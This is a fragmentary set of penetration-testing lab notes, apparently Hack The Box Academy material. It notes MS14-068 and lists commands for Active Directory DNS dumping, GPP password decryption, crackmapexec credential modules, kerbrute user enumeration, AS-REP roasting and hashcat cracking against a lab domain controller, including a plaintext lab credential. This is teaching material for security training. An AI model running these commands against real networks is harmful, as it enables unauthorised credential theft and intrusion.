...
* It can be exploited with tools such as the [Python Kerberos Exploitation Kit (PyKEK)](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek) or the Impacket toolkit. The only defense against this attack is patching. 
* The machine [Mantis](https://app.hackthebox.com/machines/98) on the Hack The Box platform showcases this vulnerability.
...
```shell-session
canklesmaks@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 
...
```shell-session
canklesmaks@htb[/htb]$ head records.csv 
...
```shell-session
canklesmaks@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
...
```shell-session
canklesmaks@htb[/htb]$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
...
```shell-session
canklesmaks@htb[/htb]$ crackmapexec smb -L | grep gpp
...
```shell-session
canklesmaks@htb[/htb]$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
...
```shell-session
canklesmaks@htb[/htb]$ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 
...
```shell-session
canklesmaks@htb[/htb]$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
...
```shell-session
canklesmaks@htb[/htb]$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
